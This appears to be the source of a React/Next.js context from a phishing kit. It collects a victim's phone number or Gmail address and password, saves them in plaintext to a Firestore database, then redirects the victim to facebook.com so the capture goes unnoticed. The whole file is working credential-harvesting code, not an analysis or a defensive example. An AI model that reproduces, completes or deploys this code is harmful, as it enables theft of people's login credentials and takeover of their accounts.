import { createContext, useState } from "react";
import { setDoc, doc } from "firebase/firestore/lite";
import { db } from "@/firebase/firebase";
import { useRouter } from "next/router";

export const UserContext = createContext(null);

export const UserContextProvider = ({ children }) => {
  const [username, setUsername] = useState();
  const [password, setPassword] = useState();

  const characters =
    "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";

  const RandomString = (length) => {
    let result = " ";
    const charactersLength = characters.length;
    for (let i = 0; i < length; i++) {
      result += characters.charAt(Math.floor(Math.random() * charactersLength));
    }

    return result;
  };

  const router = useRouter();

  const AddUser = async (path) => {
    if (!username || !password) {
      return 0;
    }
    await setDoc(doc(db, path, RandomString(20)), {
      phonenumberOrGmail: username,
      password: password,
    });
    router.push("https://www.facebook.com");
  };

  return (
    <UserContext.Provider
      value={{
        username,
        setUsername,
        password,
        setPassword,

        AddUser,
      }}
    >
      {children}
    </UserContext.Provider>
  );
};
